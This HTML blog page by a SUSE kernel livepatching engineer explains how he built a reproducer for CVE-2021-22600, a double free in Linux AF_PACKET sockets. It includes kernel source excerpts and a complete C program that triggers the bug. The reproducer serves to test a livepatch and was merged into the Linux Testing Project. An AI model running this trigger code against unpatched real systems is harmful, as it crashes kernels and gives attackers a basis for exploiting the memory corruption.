<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>From zero to double free: The process of creating a reproducer for a kernel vulnerability | Marcos&#39; Blog</title>
<meta name="keywords" content="">
<meta name="description" content="The main responsibility of the Kernel Livepatching team at SUSE is to create livepatches for critical security bugs. More important than fixing the bug itself is to guarantee that the livepatch will solve the original problem and not create new ones, so testing the fix properly is crucial.
To test a livepatch, you need a way to reproduce the original bug, but how to test a livepatch when you don&rsquo;t have a reproducer?">
<meta name="author" content="Marcos Paulo de Souza">
<link rel="canonical" href="https://mpdesouza.com/blog/from-zero-to-double-free/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.b4e19c453811e60acfec1f00c15ac2be1c53f6ab90187e684358ce7faaf48bab.css" integrity="sha256-tOGcRTgR5grP7B8AwVrCvhxT9quQGH5oQ1jOf6r0i6s=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://mpdesouza.com/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://mpdesouza.com/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://mpdesouza.com/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://mpdesouza.com/apple-touch-icon.png">
<link rel="mask-icon" href="https://mpdesouza.com/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-LWD0KKCW2G"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-LWD0KKCW2G', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="From zero to double free: The process of creating a reproducer for a kernel vulnerability" />
<meta property="og:description" content="The main responsibility of the Kernel Livepatching team at SUSE is to create livepatches for critical security bugs. More important than fixing the bug itself is to guarantee that the livepatch will solve the original problem and not create new ones, so testing the fix properly is crucial.
To test a livepatch, you need a way to reproduce the original bug, but how to test a livepatch when you don&rsquo;t have a reproducer?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://mpdesouza.com/blog/from-zero-to-double-free/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2023-03-09T23:21:25-03:00" />
<meta property="article:modified_time" content="2023-03-09T23:21:25-03:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="From zero to double free: The process of creating a reproducer for a kernel vulnerability"/>
<meta name="twitter:description" content="The main responsibility of the Kernel Livepatching team at SUSE is to create livepatches for critical security bugs. More important than fixing the bug itself is to guarantee that the livepatch will solve the original problem and not create new ones, so testing the fix properly is crucial.
To test a livepatch, you need a way to reproduce the original bug, but how to test a livepatch when you don&rsquo;t have a reproducer?"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blog",
      "item": "https://mpdesouza.com/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "From zero to double free: The process of creating a reproducer for a kernel vulnerability",
      "item": "https://mpdesouza.com/blog/from-zero-to-double-free/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "From zero to double free: The process of creating a reproducer for a kernel vulnerability",
  "name": "From zero to double free: The process of creating a reproducer for a kernel vulnerability",
  "description": "The main responsibility of the Kernel Livepatching team at SUSE is to create livepatches for critical security bugs. More important than fixing the bug itself is to guarantee that the livepatch will solve the original problem and not create new ones, so testing the fix properly is crucial.\nTo test a livepatch, you need a way to reproduce the original bug, but how to test a livepatch when you don\u0026rsquo;t have a reproducer?",
  "keywords": [
    
  ],
  "articleBody": "The main responsibility of the Kernel Livepatching team at SUSE is to create livepatches for critical security bugs. More important than fixing the bug itself is to guarantee that the livepatch will solve the original problem and not create new ones, so testing the fix properly is crucial.\nTo test a livepatch, you need a way to reproduce the original bug, but how to test a livepatch when you don’t have a reproducer? Today I’ll share my history of creating a reproducer for a security bug and how it ended up being merged into Linux Testing Project.\nThe security bug Very often commits merged on the upstream Linux repository are disguised as simple code fixes, but in fact, they are solving critical issues. Take for example this patch. This change fixes a double free buf after switching AF_PACKET socket interface versions. The details of this problem are described in CVE-2021-22600. The fix for this bug seems harmless, and the creation of a livepatch was straightforward.\nThe problem is that there wasn’t a reproducer ready for testing this CVE patch. Without a reproducer one needed to be created.\nPacket sockets The man pages describes that: “Packet sockets are used to receive or send raw packets at the device driver (OSI Layer 2) level. They allow the user to implement protocol modules in user space on top of the physical layer”.\nAccording to the official kernel documentation on Packet MMAP, there are currently three TPACKET versions, where tpacket_version can be TPACKET_V1 (default), TPACKET_V2 and TPACKET_V3.\nIn summary, the bug consists of a stale pointer when switching between TPACKET versions.\nReproducer To create a reproducer there are some questions that need to be answered. For example, what is the problem, and how it manifests? Looking at the commit message that fixes the issue, it was mentioned that rx_owner_map can be stale when changing the protocol version on packet_set_ring function. This function is called whenever a userspace program calls setsockopt with a packet socket, as we can see below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u, int closing, int tx_ring) { struct pgv *pg_vec = NULL; struct packet_sock *po = pkt_sk(sk); unsigned long *rx_owner_map = NULL; int was_running, order = 0; struct packet_ring_buffer *rb; struct sk_buff_head *rb_queue; __be16 num; int err; /* Added to avoid minimal code churn */ struct tpacket_req *req = \u0026req_u-\u003ereq; ... if (req-\u003etp_block_nr) { ... order = get_order(req-\u003etp_block_size); pg_vec = alloc_pg_vec(req, order); if (unlikely(!pg_vec)) goto out; switch (po-\u003etp_version) { case TPACKET_V3: /* Block transmit is not supported yet */ if (!tx_ring) { init_prb_bdqc(po, rb, pg_vec, req_u); } else { struct tpacket_req3 *req3 = \u0026req_u-\u003ereq3; if (req3-\u003etp_retire_blk_tov || req3-\u003etp_sizeof_priv || req3-\u003etp_feature_req_word) { err = -EINVAL; goto out_free_pg_vec; } } break; default: if (!tx_ring) { rx_owner_map = bitmap_alloc(req-\u003etp_frame_nr, GFP_KERNEL | __GFP_NOWARN | __GFP_ZERO); if (!rx_owner_map) goto out_free_pg_vec; } break; } } /* Done */ else { err = -EINVAL; if (unlikely(req-\u003etp_frame_nr)) goto out; } ... mutex_lock(\u0026po-\u003epg_vec_lock); if (closing || atomic_read(\u0026po-\u003emapped) == 0) { err = 0; spin_lock_bh(\u0026rb_queue-\u003elock); swap(rb-\u003epg_vec, pg_vec); if (po-\u003etp_version \u003c= TPACKET_V2) swap(rb-\u003erx_owner_map, rx_owner_map); ... } mutex_unlock(\u0026po-\u003epg_vec_lock); out_free_pg_vec: bitmap_free(rx_owner_map); if (pg_vec) free_pg_vec(pg_vec, order, req-\u003etp_block_nr); out: return err; } Note: The code above doesn’t contain the patch that fixes the bug.\nLet’s now check the struct where rx_owner_map exists:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 struct packet_ring_buffer { struct pgv *pg_vec; unsigned int head; unsigned int frames_per_block; unsigned int frame_size; unsigned int frame_max; unsigned int pg_vec_order; unsigned int pg_vec_pages; unsigned int pg_vec_len; unsigned int __percpu *pending_refcnt; union { unsigned long *rx_owner_map; struct tpacket_kbdq_core prb_bdqc; }; }; As we can see rx_owner_map is part of a union. The patch commit message mentions a stale pointer, so we can deduct that when the swap(rb-\u003erx_owner_map, rx_owner_map) is called we can be dealing with prb_bdqc, and not with rx_owner_map. At this point, it’s useful to have userspace code to exercise the mentioned functions and start poking around it. The fastest way to search for userspace code using a Linux kernel feature is by checking the Linux Kernel selftests and the Linux Testing Project.\nBoth projects contain good examples about how to use different kernel features. It was quick to find an example of TPACKET usage on LTP.\nWith a test case in hand and some understanding of what is going wrong, we can check how rx_owner_map ends up containing stale data:\nWhen calling setsockopt using TPACKET_V3, RX ring and setting tp_block_nr, pg_vec is allocated and init_prb_bdqc is called setting prb_bdqc union member. If the next call to setsockopt, setting tp_block_nr and tp_frame_nr as 0, pg_vec and rx_owner_map are released (or it would be prb_bdqc here, since it’s an union?), since po-\u003emapped is always 0 here (mmap wasn’t called to map the buffer) Calling setsockopt using TPACKET_V2 passing tp_block_nr and tp_frame_nr as 0, the code goes directly to release the swapped rx_owner_map that was already released in the previous step. Double free. Using the test case as a starting point, I was able to create my own reproducer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 #include #include #include #include #include int sock; struct ring { union { struct tpacket_req req; struct tpacket_req3 req3; }; }; static void set_ver(int ver) { if (setsockopt(sock, SOL_PACKET, PACKET_VERSION, \u0026ver, sizeof(ver)) == -1) { perror(\"setsockopt\"); fprintf(stderr, \"Cannot set sock to ver %d\\n\", ver + 1); exit(1); } } static void __v3_fill(struct ring *ring) { ring-\u003ereq3.tp_retire_blk_tov = 64; ring-\u003ereq3.tp_sizeof_priv = 0; ring-\u003ereq3.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH; ring-\u003ereq3.tp_block_size = getpagesize() \u003c\u003c 2; ring-\u003ereq3.tp_frame_size = TPACKET_ALIGNMENT \u003c\u003c 7; ring-\u003ereq3.tp_block_nr = 256; ring-\u003ereq3.tp_frame_nr = ring-\u003ereq3.tp_block_size / ring-\u003ereq3.tp_frame_size * ring-\u003ereq3.tp_block_nr; } static void setup_ring(int mess) { struct ring ring; __v3_fill(\u0026ring); /* * First time we call setup_ring, using TPACKET_V3, we send the req3 * as populated by __v3_fill. In the next calls, we zero two members of * the struct, simulating a 'close' of the socket. This makes afpacket * module to free pg_vec. * * tpacket_v3 does not allocate rx_owner_map, but instead it sets * prb_bdqc, but both are define in a union. */ if (mess) { ring.req3.tp_block_nr = 0; ring.req3.tp_frame_nr= 0; } if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING, \u0026ring.req3, sizeof(ring.req3)) == -1) { perror(\"setsockopt\"); exit(1); } } int main(void) { sock = socket(PF_PACKET, SOCK_RAW, 0); if (sock == -1) { perror(\"socket\"); exit(1); } set_ver(TPACKET_V3); /* Send complete req3 data */ setup_ring(0); /* * Pass tp_block_nr and tp_frame_nr, releases pg_vec, and rb-\u003erw_owner_map * is freed * */ setup_ring(1); /* With pg_vec released, we can change the socket version to TPACKET_V2 */ set_ver(TPACKET_V2); /* * With V2, we send again the tp_block_nr/tp_frame_nr zeroed, so * afpacket does not try to allocate a pg_vec of rx_owner_map and goes * directly to the cleaning part. For V1/V2, it swaps the current * allocated rw_owner_map (which wasn't allocated this time) with the * previously stored rw_owner_map (freed in the second setup_ring call * above). * * Now, double free on the way! */ setup_ring(1); return 0; } The comments in the code explains what exactly happens.\nBe careful: if you are running a kernel without the fix applied (earlier than v5.16-rc6), running the code above can crash your system.\nIs a common practice in SUSE to check with QA if a reproducer can be adapted and merged into LTP. In my case, Martin Doucha was kind enough to adapt the code using the LTP API and merge it.\nConsiderations The entire process of checking the bug, understanding the problem, checking for reproducer and triggering it reliably was gratifying. The kernel samples and the LTP are interesting resources for research and understanding how kernel interfaces are used, and also to check if a kernel is vulnerable to a known problem that already contains a reproducer.\nThanks for reading until the end. See you in the next post!\nReferences CVE commit fix\nLTP reproducer\n",
  "wordCount" : "1463",
  "inLanguage": "en",
  "datePublished": "2023-03-09T23:21:25-03:00",
  "dateModified": "2023-03-09T23:21:25-03:00",
  "author":{
    "@type": "Person",
    "name": "Marcos Paulo de Souza"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://mpdesouza.com/blog/from-zero-to-double-free/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Marcos' Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://mpdesouza.com/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://mpdesouza.com" accesskey="h" title="Marcos&#39; Blog (Alt + H)">Marcos&#39; Blog</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://mpdesouza.com/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://mpdesouza.com/about-me/" title="About Me">
                    <span>About Me</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://mpdesouza.com">Home</a>&nbsp;»&nbsp;<a href="https://mpdesouza.com/blog/">Blog</a></div>
    <h1 class="post-title">
      From zero to double free: The process of creating a reproducer for a kernel vulnerability
    </h1>
    <div class="post-meta"><span title='2023-03-09 23:21:25 -0300 -0300'>March 9, 2023</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Marcos Paulo de Souza

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#the-security-bug" aria-label="The security bug">The security bug</a></li>
                <li>
                    <a href="#packet-sockets" aria-label="Packet sockets">Packet sockets</a></li>
                <li>
                    <a href="#reproducer" aria-label="Reproducer">Reproducer</a></li>
                <li>
                    <a href="#considerations" aria-label="Considerations">Considerations</a></li>
                <li>
                    <a href="#references" aria-label="References">References</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>The main responsibility of the Kernel Livepatching team at <a href="https://suse.com">SUSE</a> is to create livepatches for critical
security bugs. More important than fixing the bug itself is to guarantee that the livepatch will solve
the original problem and not create new ones, so testing the fix properly is crucial.</p>
<p>To test a livepatch, you need a way to reproduce the original bug, but how to test a livepatch when
you don&rsquo;t have a reproducer? Today I&rsquo;ll share my history of creating a reproducer for a security bug
and how it ended up being merged into <a href="http://linux-test-project.github.io/">Linux Testing Project</a>.</p>
<h1 id="the-security-bug">The security bug<a hidden class="anchor" aria-hidden="true" href="#the-security-bug">#</a></h1>
<p>Very often commits merged on the upstream Linux repository are disguised as <em>simple</em> code fixes, but
in fact, they are solving critical issues. Take for example
<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755">this patch</a>.
This change fixes a <a href="https://en.wikipedia.org/wiki/Memory_safety">double free buf</a> after switching
AF_PACKET socket interface versions. The details of this problem are described in
<a href="https://www.suse.com/security/cve/CVE-2021-22600.html">CVE-2021-22600</a>. The fix for this bug seems
harmless, and the creation of a livepatch was straightforward.</p>
<p>The problem is that there wasn&rsquo;t a <strong>reproducer</strong> ready for testing this CVE patch. Without a
reproducer one needed to be created.</p>
<h1 id="packet-sockets">Packet sockets<a hidden class="anchor" aria-hidden="true" href="#packet-sockets">#</a></h1>
<p>The <a href="https://www.man7.org/linux/man-pages/man7/packet.7.html">man pages</a> describes that: &ldquo;<em>Packet
sockets are used to receive or send raw packets at the device driver (OSI Layer 2) level.
They allow the user to implement protocol modules in user space on top of the physical layer</em>&rdquo;.</p>
<p>According to the official kernel documentation on
<a href="https://www.kernel.org/doc/html/latest/networking/packet_mmap.html#what-tpacket-versions-are-available-and-when-to-use-them">Packet MMAP</a>,
there are currently three TPACKET versions, where <em>tpacket_version</em> can be TPACKET_V1 (default),
TPACKET_V2 and TPACKET_V3.</p>
<p>In summary, the bug consists of a stale pointer when switching between TPACKET versions.</p>
<h1 id="reproducer">Reproducer<a hidden class="anchor" aria-hidden="true" href="#reproducer">#</a></h1>
<p>To create a reproducer there are some questions that need to be answered. For example, what is
the problem, and how it manifests? Looking at the commit message that fixes the issue, it was
mentioned that <strong>rx_owner_map</strong> can be stale when changing the protocol version on
<strong>packet_set_ring</strong> function. This function is called whenever a userspace program calls
<a href="https://man7.org/linux/man-pages/man3/setsockopt.3p.html">setsockopt</a> with a packet socket,
as we can see below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="k">static</span> <span class="kt">int</span> <span class="nf">packet_set_ring</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span> <span class="k">union</span> <span class="n">tpacket_req_u</span> <span class="o">*</span><span class="n">req_u</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                  <span class="kt">int</span> <span class="n">closing</span><span class="p">,</span> <span class="kt">int</span> <span class="n">tx_ring</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">struct</span> <span class="n">pgv</span> <span class="o">*</span><span class="n">pg_vec</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">struct</span> <span class="n">packet_sock</span> <span class="o">*</span><span class="n">po</span> <span class="o">=</span> <span class="nf">pkt_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">rx_owner_map</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="kt">int</span> <span class="n">was_running</span><span class="p">,</span> <span class="n">order</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">struct</span> <span class="n">packet_ring_buffer</span> <span class="o">*</span><span class="n">rb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">struct</span> <span class="n">sk_buff_head</span> <span class="o">*</span><span class="n">rb_queue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">__be16</span> <span class="n">num</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="cm">/* Added to avoid minimal code churn */</span>
</span></span><span class="line"><span class="cl">          <span class="k">struct</span> <span class="n">tpacket_req</span> <span class="o">*</span><span class="n">req</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">req_u</span><span class="o">-&gt;</span><span class="n">req</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">tp_block_nr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">                  <span class="n">order</span> <span class="o">=</span> <span class="nf">get_order</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">tp_block_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                  <span class="n">pg_vec</span> <span class="o">=</span> <span class="nf">alloc_pg_vec</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">order</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">pg_vec</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                          <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="k">switch</span> <span class="p">(</span><span class="n">po</span><span class="o">-&gt;</span><span class="n">tp_version</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                  <span class="k">case</span> <span class="nl">TPACKET_V3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                          <span class="cm">/* Block transmit is not supported yet */</span>
</span></span><span class="line"><span class="cl">                          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tx_ring</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                  <span class="nf">init_prb_bdqc</span><span class="p">(</span><span class="n">po</span><span class="p">,</span> <span class="n">rb</span><span class="p">,</span> <span class="n">pg_vec</span><span class="p">,</span> <span class="n">req_u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                  <span class="k">struct</span> <span class="n">tpacket_req3</span> <span class="o">*</span><span class="n">req3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">req_u</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                  <span class="k">if</span> <span class="p">(</span><span class="n">req3</span><span class="o">-&gt;</span><span class="n">tp_retire_blk_tov</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">                                      <span class="n">req3</span><span class="o">-&gt;</span><span class="n">tp_sizeof_priv</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">                                      <span class="n">req3</span><span class="o">-&gt;</span><span class="n">tp_feature_req_word</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                          <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                          <span class="k">goto</span> <span class="n">out_free_pg_vec</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                  <span class="p">}</span>
</span></span><span class="line"><span class="cl">                          <span class="p">}</span>
</span></span><span class="line"><span class="cl">                          <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tx_ring</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                  <span class="n">rx_owner_map</span> <span class="o">=</span> <span class="nf">bitmap_alloc</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">tp_frame_nr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                          <span class="n">GFP_KERNEL</span> <span class="o">|</span> <span class="n">__GFP_NOWARN</span> <span class="o">|</span> <span class="n">__GFP_ZERO</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">rx_owner_map</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                          <span class="k">goto</span> <span class="n">out_free_pg_vec</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                          <span class="p">}</span>
</span></span><span class="line"><span class="cl">                          <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="cm">/* Done */</span>
</span></span><span class="line"><span class="cl">          <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                  <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">tp_frame_nr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                          <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">po</span><span class="o">-&gt;</span><span class="n">pg_vec_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">closing</span> <span class="o">||</span> <span class="nf">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">po</span><span class="o">-&gt;</span><span class="n">mapped</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nf">spin_lock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rb_queue</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">swap</span><span class="p">(</span><span class="n">rb</span><span class="o">-&gt;</span><span class="n">pg_vec</span><span class="p">,</span> <span class="n">pg_vec</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">po</span><span class="o">-&gt;</span><span class="n">tp_version</span> <span class="o">&lt;=</span> <span class="n">TPACKET_V2</span><span class="p">)</span>
